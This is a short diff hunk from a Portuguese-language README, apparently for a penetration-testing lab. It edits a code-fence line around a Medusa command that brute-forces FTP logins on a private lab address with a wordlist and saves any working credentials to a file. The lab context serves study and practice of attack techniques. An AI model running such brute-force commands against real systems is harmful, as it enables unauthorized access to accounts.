@@ -41,7 +41,7 @@ Todos os comandos e wordlists simples estão disponíveis na pasta `/attacks`.
 
 **Comando Medusa (Shell Script `medusa-ftp.sh`):**
 
-```bash
+bash
 medusa -h 192.168.56.20 -U attacks/wordlist-ftp.txt -P attacks/wordlist-ftp.txt -M ftp -O results/ftp-success.txt
 Resultado:
 
